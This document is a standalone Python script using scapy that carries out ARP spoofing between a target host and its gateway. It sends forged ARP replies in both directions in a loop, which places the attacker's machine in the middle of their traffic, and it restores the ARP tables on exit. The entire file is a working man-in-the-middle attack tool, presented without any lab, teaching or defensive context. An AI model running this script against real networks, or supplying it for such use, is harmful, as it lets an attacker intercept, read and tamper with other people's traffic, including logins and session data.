#!/usr/bin/env python3

from scapy.all import *
import sys
import time
import signal

def get_mac(ip):
    # ARP request to get MAC address of IP
    answered, _ = sr(ARP(pdst=ip), timeout=2, verbose=0)
    for s, r in answered:
        return r[ARP].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Failed to get MAC for {target_ip}")
        return

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=0)
    print(f"[+] Sent spoofed ARP reply: {target_ip} → {spoof_ip}")

def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if not target_mac or not spoof_mac:
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=5, verbose=0)
    print(f"[+] Restored ARP table for {target_ip}")

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <gateway_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    print(f"[*] Starting ARP spoof on {target_ip} via gateway {gateway_ip}")
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C — restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] Exiting.")

if __name__ == "__main__":
    main()
